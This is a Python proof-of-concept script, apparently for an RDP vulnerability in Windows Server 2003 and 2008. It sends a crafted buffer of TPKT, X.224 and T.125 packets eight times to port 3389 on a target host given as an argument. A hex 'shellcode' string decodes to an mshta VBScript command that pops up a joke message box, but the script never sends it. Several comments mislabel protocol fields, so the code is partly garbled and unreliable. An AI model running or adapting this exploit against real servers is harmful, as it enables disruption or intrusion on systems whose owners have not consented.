#RDP Blue POC 
#Local:  Win7  (python)
#Target: Win2003 & Win2008 (open 3389)

import socket
import sys
import os
import platform

buf=""
buf+="03000013" # TPKT, Version 3, lenght 19
buf+="0ee000000000000100080000000000" # ITU-T Rec X.224
buf+="030001d6" # TPKT, Version 3, lenght 470
buf+="02f080" # ITU-T Rec X.224
buf+="7f6582019404" #SERVICE T.125

buf+="01010401010101ff" 
buf+="3019020400000000"
buf+="0204000000020204"
buf+="0000000002040000"#COMMUNICATION
buf+="0001020400000000"
buf+="0204000000010202"
buf+="ffff020400000002"
buf+="3019020400000001"# TPKT, Version 5, Lenght 12
buf+="0204000000010204"
buf+="0000000102040000"
buf+="0001020400000000"
buf+="0204000000010202"
buf+="0420020400000002"#MULTIPOINT
buf+="301c0202ffff0202"
buf+="fc170202ffff0204"
buf+="0000000102040000"
buf+="0000020400000001"
buf+="0202ffff02040000"
buf+="0002048201330005"
buf+="00147c0001812a00"#message
buf+="0800100001c00044"
buf+="756361811c01c0d8"
buf+="00040008008002e0"
buf+="0101ca03aa090400"
buf+="00ce0e000048004f"# TPKT, Version 3, Lenght 12
buf+="0053005400000000"
buf+="0000000000000000"
buf+="0000000000000000"
buf+="0000000000040000"
buf+="00000000000c0000"# TPKT, Version 8, Lenght 12
buf+="0000000000000000"
buf+="0000000000000000"
buf+="0000000000000000"
buf+="0000000000000000"#nop
buf+="0000000000000000"
buf+="0000000000000000"
buf+="0000000000000000"#ITU-T Rec X.224
buf+="0000000000000000"
buf+="0001ca0100000000"
buf+="0010000700010030"
buf+="0030003000300030"
buf+="002d003000300030"#ITU-T Rec X.224
buf+="002d003000300030"
buf+="0030003000300030"
buf+="002d003000300030"
buf+="0030003000000000"
buf+="0000000000000000"#ITU-T Rec X.224
buf+="0000000000000000"
buf+="000000000004c00c"
buf+="000d000000000000"
buf+="0002c00c001b0000"
buf+="000000000003c02c"#ITU-T Rec X.224
buf+="0003000000726470"
buf+="6472000000000080"
buf+="80636c6970726472"
buf+="000000a0c0726470"
buf+="736e640000000000"
buf+="c0"

buf+="0300000c" # TPKT, Version 3, Lenght 12
buf+="02f080"  # ITU-T Rec X.224
buf+="0401000100" # MULTIPOINT-COMMUNICATION-SERVICE T.125
buf+="03000008" #TPKT, Version 3, Length 8
buf+="02f080" # ITU-T Rec X.224
buf+="28" # MULTIPOINT-COMM-SERVICE T.125
buf+="0300000c" # TPKT, Version 3, Lenght 12
buf+="02f080" # ITU-T Rec X.224
buf+="38000603ef" # MULTIPOINT-COMM-SERVICE T.125
buf+="0300000c" # TPKT, Version 3, Lenght 12
buf+="02f080" #ITU-T Rec X.224
buf+="38000603eb" # MULTIPOINT-COMM-SERVICE T.125
buf+="0300000c" # TPKT, Version 3, Lenght 12
buf+="02f080" #ITU-T Rec X.224
buf+="38000603ec"# MULTIPOINT-COMM-SERVICE T.125
buf+="0300000c"  # TPKT, Version 3, Lenght 12
buf+="02f080" #ITU-T Rec X.224
buf+="38000603ed"# MULTIPOINT-COMM-SERVICE T.125
buf+="0300000c" # TPKT, Version 3, Lenght 12
buf+="02f080" #ITU-T Rec X.224
buf+="38000603ee"# MULTIPOINT-COMM-SERVICE T.125
buf+="0300000b" # TPKT, Version 3, Lenght 12
buf+="06d00000123400"  #ITU-T Rec X.224
buf2="23796F7520706C617920"
buf2+="6261736B657462616C6C"
buf2+="206C696B652063616978"
buf2+="756B756E23";
sc="6D736874612076627363" #shellcode
sc+="726970743A6D7367626F"
sc+="782822796F7520706C61"
sc+="79206261736B65746261"
sc+="6C6C206C696B65206361"
sc+="6978756B756E21222C36"
sc+="342C224B38676567653A"
sc+="22292877696E646F772E"
sc+="636C6F736529";

buf = bytearray.fromhex(buf)


HOST = sys.argv[1]
PORT = 3389
print("Win2003 & Win2008 RDP POC")
print("Target: "+HOST)
recexec=buf
for i in range(8):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((HOST,PORT))
         
         print("sending: %d bytes" % len(buf))
         s.send(buf)
         rec = s.recv(100)
         recexec=sc
         print("received: %d bytes" % len(rec))
         s.close()
         print("")
